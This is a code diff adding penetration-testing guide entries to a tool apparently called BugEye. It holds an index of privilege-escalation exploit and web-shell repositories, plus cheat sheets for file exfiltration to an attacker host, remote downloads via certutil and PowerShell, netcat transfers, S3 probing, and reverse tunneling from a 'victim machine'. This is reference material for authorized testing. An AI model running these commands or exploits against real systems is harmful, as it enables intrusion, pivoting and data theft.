@@ -371,6 +371,359 @@ export const GUIDES: GuideEntry[] = [
     ],
     note: 'Reference and methodology only. BugEye never submits a payload for you.',
   },
+  {
+    id: 'lpe-exploit-tools',
+    title: 'Privilege Escalation & Exploit Collections',
+    summary: 'A curated index of third-party local-privilege-escalation exploits and exploit-code repositories.',
+    sections: [
+      {
+        heading: 'What this is',
+        body: 'A directory of external repositories for local privilege escalation (Windows and Linux) and general exploit collections, grouped by category so you can find a known exploit for a given CVE or technique quickly.',
+      },
+    ],
+    snippetGroups: [
+      {
+        label: 'Miscellaneous exploits',
+        snippets: [
+          { label: 'BadSuccessor LPE', value: 'https://github.com/ibaiC/BadSuccessor' },
+          { label: 'BlueHammer LPE (1)', value: 'https://git.projectnightcrawler.dev/NightmareEclipse/BlueHammer' },
+          { label: 'BlueHammer LPE (2)', value: 'https://github.com/0xjustBen/BlueHammer' },
+          { label: 'Dirty Frag Universal Linux LPE', value: 'https://github.com/V4bel/dirtyfrag' },
+          { label: 'MiniPlasma CVE-2020-17103 partially patched cldflt.sys LPE', value: 'https://git.projectnightcrawler.dev/NightmareEclipse/MiniPlasma' },
+          { label: 'NoFilter LPE', value: 'https://github.com/deepinstinct/NoFilter' },
+          { label: 'OfflineSAM LPE', value: 'https://github.com/gtworek/PSBits/tree/master/OfflineSAM' },
+          { label: 'OfflineAddAdmin2 LPE', value: 'https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2' },
+          { label: 'PrintSpoofer LPE (1)', value: 'https://github.com/dievus/printspoofer' },
+          { label: 'PrintSpoofer LPE (2)', value: 'https://github.com/itm4n/PrintSpoofer' },
+          { label: 'SharpSuccessor LPE', value: 'https://github.com/logangoins/SharpSuccessor' },
+          { label: 'Shocker Container Escape', value: 'https://github.com/gabrtv/shocker' },
+          { label: 'ssh-keysign-pwn', value: 'https://github.com/0xdeadbeefnetwork/ssh-keysign-pwn' },
+          { label: 'StorSvc LPE', value: 'https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc' },
+          { label: 'SystemNightmare LPE', value: 'https://github.com/GossiTheDog/SystemNightmare' },
+        ],
+      },
+      {
+        label: "Windows 'Potato' family LPE (SeImpersonatePrivilege chain)",
+        snippets: [
+          { label: 'ADCSCoercePotato LPE', value: 'https://github.com/decoder-it/ADCSCoercePotato' },
+          { label: 'CoercedPotato LPE', value: 'https://github.com/Prepouce/CoercedPotato' },
+          { label: 'DCOMPotato LPE', value: 'https://github.com/zcgonvh/DCOMPotato' },
+          { label: 'DeadPotato LPE', value: 'https://github.com/lypd0/DeadPotato' },
+          { label: 'GenericPotato LPE', value: 'https://github.com/micahvandeusen/GenericPotato' },
+          { label: 'GodPotato LPE', value: 'https://github.com/BeichenDream/GodPotato' },
+          { label: 'JuicyPotato LPE', value: 'https://github.com/ohpe/juicy-potato' },
+          { label: 'JuicyPotatoNG LPE', value: 'https://github.com/antonioCoco/JuicyPotatoNG' },
+          { label: 'MultiPotato LPE', value: 'https://github.com/S3cur3Th1sSh1t/MultiPotato' },
+          { label: 'RemotePotato0 LPE', value: 'https://github.com/antonioCoco/RemotePotato0' },
+          { label: 'RoguePotato LPE', value: 'https://github.com/antonioCoco/RoguePotato' },
+          { label: 'RottenPotatoNG LPE', value: 'https://github.com/breenmachine/RottenPotatoNG' },
+          { label: 'RustPotato LPE', value: 'https://github.com/safedv/RustPotato' },
+          { label: 'S4UTomato LPE', value: 'https://github.com/wh0amitz/S4UTomato' },
+          { label: 'SharpEfsPotato LPE', value: 'https://github.com/bugch3ck/SharpEfsPotato' },
+          { label: 'SigmaPotato LPE', value: 'https://github.com/tylerdotrar/SigmaPotato' },
+          { label: 'SweetPotato LPE (CCob)', value: 'https://github.com/CCob/SweetPotato' },
+          { label: 'SweetPotato LPE (uknowsec)', value: 'https://github.com/uknowsec/SweetPotato' },
+        ],
+      },
+      {
+        label: 'Exploit collections',
+        snippets: [
+          { label: 'bin-sploits', value: 'https://gitlab.com/exploit-database/exploitdb-bin-sploits' },
+          { label: 'Kernelhub', value: 'https://github.com/Ascotbe/Kernelhub' },
+          { label: 'Next.js v16.2.4 Exploit Collection', value: 'https://github.com/dwisiswant0/next-16.2.4-pocs' },
+          { label: 'Pre-compiled Windows Exploits', value: 'https://github.com/abatchy17/WindowsExploits' },
+          { label: 'Windows Exploits', value: 'https://github.com/SecWiki/windows-kernel-exploits' },
+        ],
+      },
+    ],
+    note: 'External third-party tools/exploits, not maintained or reviewed by BugEye. Use only against systems you are authorized to test, and review the source before running anything.',
+  },
+  {
+    id: 'payload-wordlist-tools',
+    title: 'Payload & Wordlist Generators',
+    summary: 'External repositories for payload collections and username/password wordlist generation tools.',
+    sections: [
+      {
+        heading: 'What this is',
+        body: 'A directory of external payload collections (web shells, generic attack payloads) and wordlist/username-generation tools, for use alongside BugEye\'s own PayloadLib and ShellGen.',
+      },
+    ],
+    snippetGroups: [
+      {
+        label: 'Payloads',
+        snippets: [
+          { label: 'Payload Box', value: 'https://github.com/payloadbox' },
+          { label: 'PayloadsAllTheThings', value: 'https://github.com/swisskyrepo/PayloadsAllTheThings' },
+          { label: 'phpggc', value: 'https://github.com/ambionics/phpggc' },
+          { label: 'PHP-Reverse-Shell', value: 'https://github.com/ivan-sincek/php-reverse-shell' },
+          { label: 'webshell', value: 'https://github.com/tennc/webshell' },
+          { label: 'Web-Shells', value: 'https://github.com/TheBinitGhimire/Web-Shells' },
+        ],
+      },
+      {
+        label: 'Wordlists',
+        snippets: [
+          { label: 'bopscrk', value: 'https://github.com/R3nt0n/bopscrk' },
+          { label: 'CeWL', value: 'https://github.com/digininja/cewl' },
+          { label: 'COOK', value: 'https://github.com/giteshnxtlvl/cook' },
+          { label: 'CUPP', value: 'https://github.com/Mebus/cupp' },
+          { label: 'Kerberos Username Enumeration', value: 'https://github.com/attackdebris/kerberos_enum_userlists' },
+          { label: 'SecLists', value: 'https://github.com/danielmiessler/SecLists' },
+          { label: 'Username Anarchy', value: 'https://github.com/urbanadventurer/username-anarchy' },
+        ],
+      },
+    ],
+    crossLinks: [
+      { pillar: 'encode-payload', moduleId: 'shellgen', label: 'Open ShellGen for reverse-shell one-liners BugEye can generate itself' },
+      { pillar: 'encode-payload', moduleId: 'payloadlib', label: "Open PayloadLib for BugEye's own payload reference" },
+    ],
+  },
+  {
+    id: 'file-transfer-cheatsheet',
+    title: 'File Transfer Cheat Sheet',
+    summary: 'Copy-paste commands for moving files to and from a target over HTTP, SMB, netcat, SSH and more.',
+    sections: [
+      {
+        heading: 'What this is',
+        body: 'Reference commands for setting up quick file-transfer servers and listeners during authorized testing: HTTP, WebDAV, SMB, netcat, Windows download/exfil one-liners, and SSH/SCP.',
+      },
+      {
+        heading: 'Tip',
+        body: 'Beware of reflected ports when setting up listeners.',
+      },
+    ],
+    snippetGroups: [
+      {
+        label: 'HTTP server',
+        snippets: [
+          { label: 'Simple Python server', value: 'python -m http.server <port>' },
+          { label: 'WebDAV server', value: 'wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r .' },
+          { label: 'Apache (copy files to /var/www/html)', value: 'sudo systemctl start apache2' },
+        ],
+      },
+      {
+        label: 'SMB server',
+        snippets: [
+          { label: 'impacket-smbserver', value: 'impacket-smbserver -smb2support share $(pwd)' },
+          { label: 'impacket-smbserver, Windows 10+ with authentication', value: 'impacket-smbserver -smb2support -user test -password test share $(pwd)' },
+        ],
+      },
+      {
+        label: 'Netcat',
+        snippets: [
+          { label: 'Start a listener', value: 'nc -lvnp <port> > received_file' },
+          { label: 'Send the file', value: 'nc <ip> <port> < <file_path>' },
+        ],
+      },
+      {
+        label: 'Downloading files (Windows)',
+        snippets: [
+          { label: 'PowerShell', value: 'iwr -uri <uri> -outfile <filename>' },
+          { label: 'CMD', value: 'certutil -urlcache -split -f <uri> <dest>' },
+          { label: 'Copy from SMB share', value: 'copy \\\\<ip>\\share\\<file>' },
+          { label: 'Mount share before copy, Win 10+ without authentication', value: 'net use Z: \\\\<ip>\\share' },
+          { label: 'Mount share before copy, Win 10+ with authentication', value: "net use Z: \\\\<ip>\\share /u:user 'pass'" },
+        ],
+      },
+      {
+        label: 'Exfiltrating files from Windows',
+        snippets: [
+          { label: 'Send file to a Python upload-enabled server (PowerShell)', value: 'Invoke-WebRequest -Uri http://<linux-ip>:<port>/upload -Method Post -InFile C:\\path\\to\\file' },
+          { label: 'Send file with curl', value: 'curl -F "file=@C:\\path\\to\\file.txt" http://<linux-ip>:<port> -u user:pass' },
+          { label: 'Copy to SMB share', value: 'copy C:\\path\\to\\file \\\\<ip>\\share' },
+        ],
+      },
+      {
+        label: 'SSH',
+        snippets: [
+          { label: 'Create keys', value: 'ssh-keygen -t rsa -b 4096' },
+          { label: 'Transfer data to', value: 'scp <file> <user>@<ip>:<path>' },
+          { label: 'Transfer data from', value: 'scp <user>@<ip>:<path> <file>' },
+          { label: 'Use legacy SCP protocol instead of SFTP', value: 'scp -O <file> <user>@<ip>:<path>' },
+        ],
+      },
+      {
+        label: 'Misc',
+        snippets: [
+          { label: 'Reduce binary size (useful before transferring)', value: 'upx <bin_path>' },
+          { label: 'Extract files from a binary', value: 'binwalk -e <bin_path>' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'os-commands-cheatsheet',
+    title: 'OS Commands Cheat Sheet',
+    summary: 'Common Linux command-line reference for post-access enumeration: users, files, processes, networking and services.',
+    sections: [
+      {
+        heading: 'What this is',
+        body: 'A quick-reference set of standard Linux/Unix commands for system information, user management, file operations, process management, networking, and service control, useful during authorized post-access enumeration.',
+      },
+    ],
+    snippetGroups: [
+      {
+        label: 'System information',
+        snippets: [
+          { label: 'Kernel info', value: 'uname -a' },
+          { label: 'Distro info', value: 'lsb_release -a' },
+        ],
+      },
+      {
+        label: 'User management',
+        snippets: [
+          { label: 'Show user info', value: 'id <username>' },
+          { label: 'Current user', value: 'whoami' },
+          { label: "User's groups", value: 'groups <username>' },
+          { label: 'Switch to user', value: 'su - <username>' },
+          { label: 'Switch to root', value: 'sudo su -' },
+          { label: 'Check sudo permissions', value: 'sudo -l' },
+          { label: 'Show who is logged in', value: 'who' },
+          { label: 'Show last logins', value: 'last' },
+        ],
+      },
+      {
+        label: 'File operations',
+        snippets: [
+          { label: 'Find file by name', value: 'find / -name filename 2>/dev/null' },
+          { label: 'Find text in files', value: 'grep -r "text" /path 2>/dev/null' },
+          { label: 'Compress files', value: 'tar -czvf archive.tar.gz /path' },
+          { label: 'Extract archive', value: 'tar -xzvf archive.tar.gz' },
+          { label: 'Find a program', value: 'which <program>' },
+        ],
+      },
+      {
+        label: 'Process management',
+        snippets: [
+          { label: 'List all processes', value: 'ps aux' },
+          { label: 'Kill a process', value: 'kill <pid>' },
+          { label: 'Force-kill a process', value: 'kill -9 <pid>' },
+          { label: 'Find process PID by name', value: 'pgrep process_name' },
+        ],
+      },
+      {
+        label: 'Networking',
+        snippets: [
+          { label: 'Show interfaces', value: 'ip a' },
+          { label: 'List listening connections', value: 'ss -ntplu' },
+          { label: 'Show processes listening on a port', value: 'lsof :i<port>' },
+          { label: 'DNS lookup', value: 'dig domain' },
+          { label: 'Kill a connection on a port', value: 'fuser -k <port>/tcp' },
+          { label: 'Routing table', value: 'ip route show' },
+          { label: 'Log incoming traffic on a port', value: 'sudo tcpdump -nvvvXi tun0 tcp port 8080' },
+        ],
+      },
+      {
+        label: 'Service management',
+        snippets: [
+          { label: 'Check service status (systemd)', value: 'systemctl status service_name' },
+          { label: 'Start/stop/restart a service (systemd)', value: 'systemctl start|stop|restart service_name' },
+          { label: 'Enable/disable at boot', value: 'systemctl enable|disable service_name' },
+          { label: 'Check service status (no systemd)', value: 'service service_name status' },
+        ],
+      },
+      {
+        label: 'System control',
+        snippets: [
+          { label: 'Reboot', value: 'sudo reboot' },
+          { label: 'Shutdown', value: 'sudo shutdown -h now' },
+        ],
+      },
+      {
+        label: 'Git',
+        snippets: [
+          { label: 'Dump an exposed .git repo (git-dumper)', value: 'git-dumper <url>/.git ./website' },
+          { label: 'Show commit log', value: 'git log' },
+          { label: "Show a commit's changes", value: 'git show <commit>' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'aws-s3-cheatsheet',
+    title: 'AWS S3 Cheat Sheet',
+    summary: 'AWS CLI commands for listing, downloading and probing S3 buckets discovered during recon.',
+    sections: [
+      {
+        heading: 'What this is',
+        body: 'Reference AWS CLI commands for interacting with S3 buckets: listing contents without credentials, downloading a bucket, checking its policy, and uploading a file when a misconfiguration allows it.',
+      },
+    ],
+    snippetGroups: [
+      {
+        label: 'S3',
+        snippets: [
+          { label: 'List a public bucket without credentials', value: 'aws s3 ls s3://<bucket>/ --endpoint-url <url> --no-sign-request' },
+          { label: 'Download a bucket', value: 'aws s3 cp s3://<bucket> ./' },
+          { label: 'Check bucket policy', value: 'aws s3api get-bucket-policy --bucket <bucket> --endpoint-url <url> --no-sign-request' },
+          { label: 'Upload a file to a bucket', value: 'aws s3 cp <file> s3://<bucket>/ --endpoint-url <url> --no-sign-request' },
+        ],
+      },
+    ],
+    crossLinks: [{ pillar: 'osint', moduleId: 'bucketspot', label: 'Open BucketSpot to find exposed buckets first' }],
+    note: "Out of scope for most engagements unless the target's own AWS access keys are found during testing, set up credentials first with aws configure only if you have explicit authorization.",
+  },
+  {
+    id: 'port-forwarding-tunneling',
+    title: 'Port Forwarding & Tunneling',
+    summary: 'Commands for socat, SSH, Chisel, Ligolo-ng, dnscat2 and sshuttle to pivot traffic between networks.',
+    sections: [
+      {
+        heading: 'What this is',
+        body: 'Reference commands for the common port-forwarding and tunneling tools used to pivot traffic during authorized testing: socat, SSH forwarding, Chisel, Ligolo-ng, DNS tunneling with dnscat2, sshuttle, and Windows-side tunneling tools.',
+      },
+    ],
+    snippetGroups: [
+      {
+        label: 'Socat',
+        snippets: [{ label: 'Port redirection', value: 'socat TCP-LISTEN:<local_port>,fork TCP:<ip>:<port>' }],
+      },
+      {
+        label: 'SSH port forwarding',
+        snippets: [
+          { label: 'Local port forwarding', value: 'ssh -L 8080:localhost:80 user@ssh_server' },
+          { label: 'Remote port forwarding', value: 'ssh -R 127.0.0.1:9090:<target>:80 user@kali_machine' },
+          { label: 'Dynamic port forwarding (SOCKS proxy)', value: 'ssh -D 9050 user@10.4.213.215' },
+        ],
+      },
+      {
+        label: 'Chisel',
+        snippets: [
+          { label: 'Create server', value: 'chisel server --port 8080 --reverse' },
+          { label: 'Create client on remote machine', value: 'chisel client <local_host>:8080 R:<local_port>:localhost:<remote_port>' },
+          { label: 'Create SOCKS5 server', value: 'chisel server --port 8080 --reverse --socks5' },
+          { label: 'Create SOCKS5 client', value: 'chisel client <local_host>:8080 R:socks' },
+        ],
+      },
+      {
+        label: 'Ligolo-ng',
+        snippets: [
+          { label: 'Releases', value: 'https://github.com/nicocha30/ligolo-ng/releases' },
+          { label: 'Start proxy on attacker machine', value: './li-proxy -selfcert -laddr 0.0.0.0:443' },
+          { label: 'Start agent on target machine', value: './li-agent -connect <attacker_ip>:443 -ignore-cert' },
+        ],
+      },
+      {
+        label: 'DNS tunneling (dnscat2)',
+        snippets: [
+          { label: 'Start server', value: 'dnscat2-server feline.corp' },
+          { label: 'Connect from victim machine', value: 'dnscat feline.corp' },
+        ],
+      },
+      {
+        label: 'Sshuttle',
+        snippets: [{ label: 'VPN-like tunnel between networks', value: 'sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24' }],
+      },
+      {
+        label: 'Windows tunneling tools',
+        snippets: [
+          { label: 'ssh.exe dynamic reverse tunnel', value: 'ssh -N -R 9998 kali@192.168.45.171' },
+          { label: 'Plink SSH tunnel', value: 'C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4' },
+          { label: 'Netsh port proxy', value: 'netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215' },
+        ],
+      },
+    ],
+  },
 ];
 
 export interface ChecklistItem {
